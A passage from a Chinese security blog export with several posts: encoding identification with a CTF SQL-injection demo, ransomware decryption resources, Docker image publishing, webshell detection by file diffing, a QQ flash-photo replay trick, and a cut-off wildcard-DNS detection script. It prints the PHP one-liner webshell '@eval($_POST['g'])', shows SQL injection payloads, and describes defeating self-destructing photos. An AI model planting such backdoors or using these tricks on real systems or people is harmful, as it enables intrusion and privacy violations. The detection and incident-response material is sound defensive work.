<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009295457-6bfb19de-f1ec-4a1a-be5a-2115b676a88e.png" alt="img"></p>
<p>&emsp;&emsp;为双数时，最后一个为%u0000</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631427823242-5d2fc701-ccfb-491a-8bc3-ec2c4d63a3a4.png" alt="img"></p>
<p>&emsp;&emsp;通过单数和双数的比较也能侧面反映出，%u+4位数字对应两位字符</p>
<h2 id="8、AES"><a href="#8、AES" class="headerlink" title="8、AES"></a>8、AES</h2><p>&emsp;&emsp;是一种安全的加密方式，涉及到密码，偏移量，数据块，填充，在加密时候涉及到4种随机性。解密难度大。用base64解密出来是乱码，有很大可能是AES加密。有时候/出现在字符串里面。比较注重安全和大型网站、安全比赛<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009295532-b1755fc0-94ce-45c4-84a3-97f05db9b007.png" alt="img"></p>
<h2 id="9、DES"><a href="#9、DES" class="headerlink" title="9、DES"></a>9、DES</h2><p>&emsp;&emsp;类似于BASE64，有时候+会出现字符串里</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009295607-6d69664a-ae6f-4bb8-91d2-d0a94097297a.png" alt="img"></p>
<h1 id="三、常见加密形式算法解析"><a href="#三、常见加密形式算法解析" class="headerlink" title="三、常见加密形式算法解析"></a>三、常见加密形式算法解析</h1><p>&emsp;&emsp;直接加密，带salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等</p>
<h1 id="四、常见解密方式（针对）"><a href="#四、常见解密方式（针对）" class="headerlink" title="四、常见解密方式（针对）"></a>四、常见解密方式（针对）</h1><p>&emsp;&emsp;枚举，自定义逆向算法，可逆向</p>
<h1 id="五、了解常规加密算法的特性"><a href="#五、了解常规加密算法的特性" class="headerlink" title="五、了解常规加密算法的特性"></a>五、了解常规加密算法的特性</h1><p>&emsp;&emsp;长度位数，字符规律，代码分析，搜索获取等</p>
<h1 id="六、演示案例"><a href="#六、演示案例" class="headerlink" title="六、演示案例"></a>六、演示案例</h1><h2 id="1、SQL注入漏洞测试（参数加密）"><a href="#1、SQL注入漏洞测试（参数加密）" class="headerlink" title="1、SQL注入漏洞测试（参数加密）"></a>1、SQL注入漏洞测试（参数加密）</h2><ol>
<li><p>进入题目<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009328449-b3b9a111-b158-45b8-8d76-fdddb6d182f7.png" alt="img"></p>
</li>
<li><p>使用御剑扫描该IP<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009328616-d19a31c2-cc9a-4d16-a43f-1bf13a1b8d84.png" alt="img"></p>
</li>
<li><p>在浏览器中输入该URL，发现使用PHP文件<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009328717-1f1af3db-8b69-48c7-a405-5ede814c53a0.png" alt="img"></p>
</li>
<li><p>访问该URL，下载压缩包并解压<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009328788-35a73086-1963-40d3-a667-144f845e56c5.png" alt="img"></p>
</li>
<li><p>得到解密源码<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009328861-174cadf0-c93b-4f78-9c36-1f69848732ac.png" alt="img"></p>
</li>
<li><p>审计源码，发现是由两次base64加密得到。<br>一次base64解密，<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009329047-f2d55761-c063-4f56-a75a-edb377c08d61.png" alt="img"></p>
</li>
<li><p>二次base64解密：</p>
</li>
</ol>
<p>&emsp;&emsp;选中对应模式：<br>&emsp;&emsp;AES加密模式：CBC、数据块：128位、密码：ydhaqPQnexoaDuW3、偏移量：2018201920202021<br>&emsp;&emsp;解密得出：1_mozhe<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009329131-edee9451-df51-48b1-8209-00872a6f056e.png" alt="img"></p>
<ol start="8">
<li><p>审计代码，最终得出值为：1<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009329226-e70f8990-d301-4f16-bc3a-e141e879fc04.png" alt="img"></p>
</li>
<li><p>在SQL注入时，要将1 and 1=1或者其他payload共同按格式加密之后才可以进行<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009329352-81751509-51df-40d9-9bec-873da368fdc2.png" alt="img"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>勒索病毒自救指南</title>
    <url>/post/471da697.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>经常会有一些小伙伴问：中了勒索病毒，该怎么办，可以解密吗？</p>
<p>第一次遇到勒索病毒是在早几年的时候，客户因网站访问异常，进而远程协助进行排查。登录服务器，在站点目录下发现所有的脚本文件及附件后缀名被篡改，每个文件夹下都有一个文件打开后显示勒索提示信息，这便是勒索病毒的特征。</p>
<p>出于职业习惯，我打包了部分加密文件样本和勒索病毒提示信息用于留档，就在今天，我又重新上传了样本，至今依然无法解密。</p>
<p>作为一个安全工程师，而非一个专业的病毒分析师，我们可以借助各大安全公司的能力，寻找勒索病毒的解密工具。</p>
<p>本文整理了一份勒索病毒自救指南，通过勒索病毒索引引擎查找勒索病毒相关信息，再通过各个安全公司提供的免费勒索软件解密工具解密。当然，能否解密全凭运气，so，平时还是勤打补丁多备份。</p>
<h1 id="二、勒索病毒搜索引擎"><a href="#二、勒索病毒搜索引擎" class="headerlink" title="二、勒索病毒搜索引擎"></a>二、勒索病毒搜索引擎</h1><p>在勒索病毒搜索引擎输入病毒名、勒索邮箱、被加密后文件的后缀名，或直接上传被加密文件、勒索提示信息，即可可快速查找    到病毒详情和解密工具。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648821297213-c17efdc7-0563-4f84-89ab-8866be72af56.png" alt="img"></p>
<p>这些网站的解密能力还在持续更新中，是值得收藏的几个勒索病毒工具型网站。</p>
<hr>
<p>【360】 勒索病毒搜索引擎，支持检索超过800种常见勒索病毒</p>
<p>官网：<a href="http://lesuobingdu.360.cn/">http://lesuobingdu.360.cn</a></p>
<p>【腾讯】 勒索病毒搜索引擎，支持检索超过 300 种常见勒索病毒</p>
<p>官网：<a href="https://guanjia.qq.com/pr/ls">https://guanjia.qq.com/pr/ls</a></p>
<p>【启明】VenusEye勒索病毒搜索引擎，超300种勒索病毒家族</p>
<p>官网：<a href="https://lesuo.venuseye.com.cn/">https://lesuo.venuseye.com.cn</a></p>
<p>【奇安信】勒索病毒搜索引擎</p>
<p>官网：<a href="https://lesuobingdu.qianxin.com/">https://lesuobingdu.qianxin.com</a></p>
<p>【深信服】勒索病毒搜索引擎</p>
<p>官网：<a href="https://edr.sangfor.com.cn/#/information/ransom_search">https://edr.sangfor.com.cn/#/information/ransom_search</a></p>
<hr>
<h1 id="三、勒索软件解密工具集"><a href="#三、勒索软件解密工具集" class="headerlink" title="三、勒索软件解密工具集"></a>三、勒索软件解密工具集</h1><p>很多安全公司都提供了免费的勒索病毒解密工具下载，收集和整理相关下载地址，可以帮助我们了解和获取最新的勒索病毒解密工具。</p>
<hr>
<p>【腾讯哈勃】勒索软件专杀工具</p>
<p>官网：<a href="https://habo.qq.com/tool">https://habo.qq.com/tool</a></p>
<p>【金山毒霸】勒索病毒免疫工具</p>
<p>官网：<a href="http://www.duba.net/dbt/wannacry.html">http://www.duba.net/dbt/wannacry.html</a></p>
<p>【火绒】安全工具下载</p>
<p>官网：<a href="http://bbs.huorong.cn/forum-55-1.html">http://bbs.huorong.cn/forum-55-1.html</a></p>
<p>【瑞星】解密工具下载</p>
<p>官网：<a href="http://it.rising.com.cn/fanglesuo/index.html">http://it.rising.com.cn/fanglesuo/index.html</a></p>
<p>【nomoreransom】勒索软件解密工具集</p>
<p>官网：<a href="https://www.nomoreransom.org/zh/index.html">https://www.nomoreransom.org/zh/index.html</a></p>
<p>【MalwareHunterTeam】勒索软件解密工具集</p>
<p>官网：<a href="https://id-ransomware.malwarehunterteam.com/">https://id-ransomware.malwarehunterteam.com</a></p>
<p>【卡巴斯基】免费勒索解密器</p>
<p>官网：<a href="https://noransom.kaspersky.com/">https://noransom.kaspersky.com</a></p>
<p>【Avast】免费勒索软件解密工具</p>
<p>官网：<a href="https://www.avast.com/zh-cn/ransomware-decryption-tools">https://www.avast.com/zh-cn/ransomware-decryption-tools</a></p>
<p>【Emsisoft】免费勒索软件解密工具</p>
<p>官网：<a href="https://www.emsisoft.com/ransomware-decryption-tools/free-download">https://www.emsisoft.com/ransomware-decryption-tools/free-download</a></p>
<p>【GitHub 项目】勒索病毒解密工具收集汇总</p>
<p>官网：<a href="https://github.com/jiansiting/Decryption-Tools">https://github.com/jiansiting/Decryption-Tools</a></p>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>发布自己的镜像</title>
    <url>/post/23e16792.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>&emsp;&emsp;地址：<a href="https://hub.docker.com/">https://hub.docker.com/</a> 注册自己的账号</p>
<p>&emsp;&emsp;在我们服务器上登录自己的DockerHub账号：<code>docker login -u 用户名 -p 密码</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630779657095-37375107-3b26-4f1a-896d-c86cf7a64a32.png" alt="img"></p>
<p>&emsp;&emsp;登录完毕就可以提交自己镜像了：<code>docker push 用户名/镜像名:TAG</code></p>
<ul>
<li>这里我先用<code>docker tag 镜像ID ...</code>命令对镜像进行了重命名和TAG设置</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630781971355-168d52cc-ae9f-46ce-b214-e3dd7e9abe27.png" alt="img"></p>
<p>&emsp;&emsp;push成功</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630784283998-c840345f-a28f-4ec5-8c51-b54807ab6c53.png" alt="img"></p>
<p>&emsp;&emsp;查看DockerHub的确上传成功了</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630784629448-9c399d90-6f16-4343-b0f3-e7191278d180.png" alt="img"></p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>如何发现隐藏的WebShell后门</title>
    <url>/post/5542d8c4.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>如何在百万行代码里发现隐藏的后门？</p>
<p>试想一下，如果你的网站被入侵，攻击者留下隐藏的后门，你真的都可以找出来吗？面对一个大中型的应用系统，数以百万级的代码行，是不可能做到每个文件每段代码进行手工检查的。</p>
<p>即使是一款拥有 99.9% 的 Webshell 检出率的检测引擎，依然可能存在 Webshell 绕过的情况。另外，像暗链、网页劫持、页面跳转等常见的黑帽 SEO 手法，也很难通过手动检测或工具检测全部识别出来。</p>
<p>最好的方式就是做文件完整性验证。通过与原始代码对比，可以快速发现文件是否被篡改以及被篡改的位置。当然，第一个前提是，你所在的团队已具备代码版本管理的能力，如果你是个人站长，相信你已经备份了原始代码。</p>
<p>本文将结合实际应用，介绍几种文件完整性验证方式，可以帮助你找出代码中所有隐藏的后门。</p>
<h1 id="二、方法"><a href="#二、方法" class="headerlink" title="二、方法"></a>二、方法</h1><h3 id="1、文件-MD5-校验"><a href="#1、文件-MD5-校验" class="headerlink" title="1、文件 MD5 校验"></a>1、文件 MD5 校验</h3><p>下载D盾_Web查杀工具的时候，我们可以留意到下载的压缩包里，除了有一个 exe 可执行文件，还有一个文件 md5 值。这个是软件作者在发布软件时，通过 md5 算法计算出该 exe 文件的”特征值”。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">下载地址：http://www.d99net.net/down/WebShellKill_V2.0.9.zip</span><br><span class="line">文件 MD5：29285decadbce3918a4f8429ec33df46   WebShellKill.exe</span><br></pre></td></tr></table></figure>

<p>当用户下载软件时，可以使用相同的校验算法计算下载到 exe 文件的特征值，并与软件开发者发布的特征值比较。如果两个特征值相同，则认为下载到的 exe 文件是正确的。如果两个特征值不同，则认为下载到 exe 文件是被篡改过的。</p>
<p>那同理可得，我们可以将所有网站文件计算一次 hash 值保存，当出现应急情况时，重新计算一次 hash 值，并与上次保存的 hash 值进行对比，从而输出新创建的、修改过及删除的文件列表。</p>
<p>文件 hash 值计算：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5sum</span>(<span class="params">file</span>):</span></span><br><span class="line">    m = hashlib.md5()  <span class="comment"># 获取一个md5加密算法对象</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(file):</span><br><span class="line">        f = <span class="built_in">open</span>(file,<span class="string">&#x27;rb&#x27;</span>) <span class="comment"># 因为hashlib是对二进制进行加密的，如果直接对字符串加密的话，会报错的。因此需要通过encode将字符串转码成二进制格式或者直接用二进制打开</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            m.update(line) <span class="comment"># 制定需要加密的字符串，这里就是把每一行都加密</span></span><br><span class="line">        f.close</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        m.update(file)</span><br><span class="line">    <span class="keyword">return</span> (m.hexdigest()) <span class="comment"># 返回加密后的16进制字符串</span></span><br></pre></td></tr></table></figure>

<p>对文件进行哈希值重新计算，进行校验对比，测试效果：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648819752595-0f6e7645-3f7b-4d8e-ae08-be94d06f6f9f.png" alt="img"></p>
<p>如上图，在上传目录新增了一个 evil.php 文件，还有一个被篡改的文件是 low.php 。使用常见的编辑器 Notepad++ 进行对比，可以发现 low.php 文件里被插入了一句话 WebShell。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648819785818-ba07b205-7c04-45a2-89d1-a58c23adf0ae.png" alt="img"></p>
<h3 id="2、diff-命令"><a href="#2、diff-命令" class="headerlink" title="2、diff 命令"></a>2、diff 命令</h3><p>在 Linux 中，我们经常使用 diff 命令来比较两个文本文件的差异。同样，我们可以通过一行命令快速找出两个项目文件的差异。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">diff -c -a -r cms1 cms2</span><br></pre></td></tr></table></figure>

<p>如下图所示，前三行列出了两个要对比的文件目录的差异，可以发现 low.php 文件被篡改过，篡改的内容是 <code>@eval($_POST[&#39;g&#39;]);</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648820690681-bd3ab122-0e50-43b5-a070-8ae2536ec96d.png" alt="img"></p>
<p>备注：如果只是想查看两个文件是否不同又不想显示差异之处的话，可以加上 -q 选项。</p>
<h3 id="3、版本控制工具"><a href="#3、版本控制工具" class="headerlink" title="3、版本控制工具"></a>3、版本控制工具</h3><p>版本控制工具，比如说 git，重新上传代码到 git，add+commit+push，然后打开项目，点击 commits，在历史提交版本里面，查看文件更改内容，很容易就可以发现代码被篡改的地方了。</p>
<p>另外，也可以通过 git diff 用来比较文件之间的不同。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648820837114-2ec94926-e56c-4fd0-b690-6e7a1a64d695.png" alt="img"></p>
<h3 id="4、文件对比工具"><a href="#4、文件对比工具" class="headerlink" title="4、文件对比工具"></a>4、文件对比工具</h3><p>关键词：代码对比工具，你会找到很多好用的工具，这里我们推荐两款效果还不错的工具，Beyond Compare 和 WinMerge。</p>
<h4 id="（1）Beyond-Compare"><a href="#（1）Beyond-Compare" class="headerlink" title="（1）Beyond Compare"></a>（1）Beyond Compare</h4><p>Beyond Compare 是一套由 Scooter Software 推出的文件比较工具。主要用途是对比两个文件夹或者文件，并将差异以颜色标示，比较范围包括目录，文档内容等。</p>
<p>下载地址：<a href="http://www.scootersoftware.com/download.php">http://www.scootersoftware.com/download.php</a></p>
<p>软件使用示例，通过文件夹比较，找出文件夹中的差异内容。</p>
<ol>
<li>双击 Beyond Compare ，打开软件主页，选择文件夹比较。</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648820880936-1d912749-61b2-49dc-b691-43da49cb3e13.png" alt="img"></p>
<ol start="2">
<li>在双边栏输入文件夹路径，点击显示差别，列出差异部分的内容，紫色部分为新增文件，红色部分为篡改文件。</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648820893563-1e6c0e87-5215-4718-ac8f-ff284ad57e00.png" alt="img"></p>
<ol start="3">
<li>双击具体文件，进入代码对比，找到代码差异部分。</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648820902027-b9389a96-4d72-41c9-9ae1-1165c17a83e8.png" alt="img"></p>
<h4 id="（2）WinMerge"><a href="#（2）WinMerge" class="headerlink" title="（2）WinMerge"></a>（2）WinMerge</h4><p>WinMerge 是一款运行于 Windows 系统下的文件比较和合并工具，使用它可以非常方便地比较文件夹和文件，以易于理解的可视文本格式显示差异。</p>
<p>下载地址：<a href="https://winmerge.org/downloads/">https://winmerge.org/downloads/</a></p>
<ol>
<li>文件 – 打开，选择文件或文件夹，然后点击进行比较。</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648820918229-c6c898fb-4e99-49cb-b004-208f0207c3ec.png" alt="img"></p>
<ol start="2">
<li>在同一个界面里，通过颜色和文本提示，显示文件夹内容差异。</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648820930011-a435b275-f6ed-4c98-beba-ba252822242d.png" alt="img"></p>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>如何纯手工破解QQ闪照？不限次数观看</title>
    <url>/post/a5c589f5.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、杂谈"><a href="#一、杂谈" class="headerlink" title="一、杂谈"></a>一、杂谈</h1><p>有的时候遇到心仪的女/男孩子发照片，或者是hxd发的好东西，或者是一些涉及信息泄露的照片，大多数都是以闪照的形式接收。但如果想反复查看几次，应该怎么办呢？</p>
<p>下面教大家手工的方式实现无限次观看闪照，分为视频教程和图文演示</p>
<h1 id="二、视频教程"><a href="#二、视频教程" class="headerlink" title="二、视频教程"></a>二、视频教程</h1><div id="dplayer1" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer1"),"theme":"#da4e7f","screenshot":true,"video":{"url":"/video/2022042201.mp4","pic":"https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1650599015839-05a1e65d-5801-400f-8688-93b08967ffb1.jpeg"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script>

<h1 id="三、图文演示"><a href="#三、图文演示" class="headerlink" title="三、图文演示"></a>三、图文演示</h1><p>我们正常收到闪照查看5秒完毕后，闪照会自动销毁</p>
<p>此时我们点右上角</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1650599015839-05a1e65d-5801-400f-8688-93b08967ffb1.jpeg" alt="img"></p>
<p>删除聊天记录（删除漫游记录不勾选）</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1650599046813-ffaa2b74-3f8b-4401-98af-dc5dd966797a.jpeg" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1650599061383-1f432c26-ce23-4c65-ad7b-5899742e3a7c.jpeg" alt="img"></p>
<p>然后我们点击查找聊天记录</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1650599069947-7bd0ed50-c3f7-47e0-a0b6-dd4d93579161.jpeg" alt="img"></p>
<p>选择全部</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1650599085582-501e1123-3c58-437b-84ca-f8faa2d140a2.jpeg" alt="img"></p>
<p>发现闪照又回来了，可以继续长按查看</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1650599099976-9c87ecc2-70a9-46b3-843c-f47f1d907d71.jpeg" alt="img"></p>
<p>或者直接回到聊天界面，又可以重复打开观看了</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1650599187740-54db4015-dd9a-4755-812c-e6acead16131.jpeg" alt="img"></p>
<p>查看后，此时闪照又销毁了，我们只需要重复删除聊天记录（取消勾选漫游）–查看聊天记录–选择全部，这样就又可以查看闪照了</p>
]]></content>
      <categories>
        <category>社工</category>
      </categories>
      <tags>
        <tag>社工</tag>
        <tag>QQ技术</tag>
      </tags>
  </entry>
  <entry>
    <title>子域名爆破的泛解析问题</title>
    <url>/post/9f38e83a.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>字节跳动——渗透测试实习生面试题：<strong>信息收集如何处理子域名爆破的泛解析问题？</strong></p>
<h1 id="一、什么是域名泛解析"><a href="#一、什么是域名泛解析" class="headerlink" title="一、什么是域名泛解析"></a>一、什么是域名泛解析</h1><p> &emsp;&emsp;利用通配符* （星号）来做次级域名以实现所有的次级域名均指向同一IP地址。在域名前添加任何子域名，均可访问到所指向的IP地址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常规域名解析</span><br><span class="line">www.wolke.cn   10.10.10.10</span><br><span class="line"></span><br><span class="line">域名泛解析</span><br><span class="line">*.wolke.cn     10.10.10.10</span><br><span class="line">访问子域名a.wolke.cn，b.wolke.cn等均指向10.10.10.10</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这为我们去做子域名爆破带来了极大的不便，以前子域名爆破常用的是layer子域名挖掘机。不过layer子域名挖掘机在跑具有泛解析的站的时候，就不是那么适用</p>
<h1 id="二、域名泛解析对抗"><a href="#二、域名泛解析对抗" class="headerlink" title="二、域名泛解析对抗"></a>二、域名泛解析对抗</h1><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1090320-20220303134448547-2070878323.png" alt="img"></p>
<p>&emsp;&emsp;这里以淘宝和百度为例子：ping一个绝对随机不可能存在的域名，它解析了，那么说明它大概率使用了泛解析</p>
<p>&emsp;&emsp;淘宝可能存在域名泛解析👇</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1669041209348-c8088bf5-bba6-4560-88ca-4f11fc7d3110.png" alt="1669041209348-c8088bf5-bba6-4560-88ca-4f11fc7d3110"></p>
<p>&emsp;&emsp;百度可能不存在域名泛解析👇</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1669041304697-185ced71-dd14-4cbb-90de-2189ad5195b7.png" alt="1669041304697-185ced71-dd14-4cbb-90de-2189ad5195b7"></p>
<p>&emsp;&emsp;针对百度，我们可以直接使用layer子域名挖掘机等子域名爆破工具，而针对淘宝的资产,我们不能使用layer子域名挖掘机等常规工具</p>
<h3 id="1、判断是否使用了泛解析"><a href="#1、判断是否使用了泛解析" class="headerlink" title="1、判断是否使用了泛解析"></a>1、判断是否使用了泛解析</h3><p>&emsp;&emsp;思路：五次完全随机的域名前缀A记录解析</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiodns</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">resolver = aiodns.DNSResolver(loop=loop)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">query</span>(<span class="params">name, query_type</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">await</span> resolver.query(name, query_type)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_to_A</span>(<span class="params">main_domain</span>):</span></span><br><span class="line">    total = []</span><br><span class="line">    <span class="comment"># 随机循环五次</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        sub_domain = <span class="string">&quot;&quot;</span>.join(random.sample(<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>, random.randint(<span class="number">8</span>, <span class="number">12</span>)))</span><br><span class="line">        res = query(sub_domain + <span class="string">&quot;.&quot;</span> + main_domain, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">        result = loop.run_until_complete(res)</span><br><span class="line">        total.append(result)</span><br><span class="line">    <span class="keyword">return</span> total</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main_domain = <span class="built_in">input</span>(<span class="string">&quot;Please input the main_doamin: &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(random_to_A(main_domain)).replace(<span class="string">&quot;],&quot;</span>, <span class="string">&quot;],\n&quot;</span>))</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20221123165746034.png"></p>
<p>&emsp;&emsp;五次完全A记录解析成功，认为存在泛解析，如果不存在泛解析问题，就常规子域名收集一把梭，如果检测出泛解析，就使用破泛解析的子域名爆破工具。</p>
<h3 id="2、CNAME查询黑名单"><a href="#2、CNAME查询黑名单" class="headerlink" title="2、CNAME查询黑名单"></a>2、CNAME查询黑名单</h3><p>&emsp;&emsp;思路：维护特定厂商CNAME列表</p>
<p>&emsp;&emsp;CNAME查询几个不存在的淘宝域名，也是一样的思路，循环多次不存在的域名，如果访问不存在的域名，CNAME为shop.taobao.com</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1669193168248-7d656a00-3ed7-42a4-889f-d51c92f74d2b.png" alt="img"></p>
<h3 id="3、A记录查询命中次数"><a href="#3、A记录查询命中次数" class="headerlink" title="3、A记录查询命中次数"></a>3、A记录查询命中次数</h3><p>&emsp;&emsp;如果A记录查询，命中相同ip&gt;10，后续的爆破A记录解析的域名就不展示记录</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20221123165746034.png" alt="image-20221123165746034"></p>
<h1 id="三、脚本源码"><a href="#三、脚本源码" class="headerlink" title="三、脚本源码"></a>三、脚本源码</h1><p>&emsp;&emsp;附上自己编写的简单的泛解析识别脚本源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiodns</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> optparse</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">resolver = aiodns.DNSResolver(loop=loop)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">query</span>(<span class="params">name, query_type</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">await</span> resolver.query(name, query_type)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_to_A</span>(<span class="params">main_domain</span>):</span></span><br><span class="line">    total = []</span><br><span class="line">    <span class="comment"># 随机循环五次</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        sub_domain = <span class="string">&quot;&quot;</span>.join(random.sample(<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>, random.randint(<span class="number">8</span>, <span class="number">12</span>)))</span><br><span class="line">        res = query(sub_domain + <span class="string">&quot;.&quot;</span> + main_domain, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">        result = loop.run_until_complete(res)</span><br><span class="line">        total.append(result)</span><br><span class="line">    <span class="keyword">return</span> total</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_to_cname</span>(<span class="params">sub_domain</span>):</span></span><br><span class="line">    res = query(sub_domain, <span class="string">&#x27;CNAME&#x27;</span>)</span><br><span class="line">    result = loop.run_until_complete(res)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = optparse.OptionParser(<span class="string">&quot;%prog &quot;</span> + <span class="string">&quot;[options] 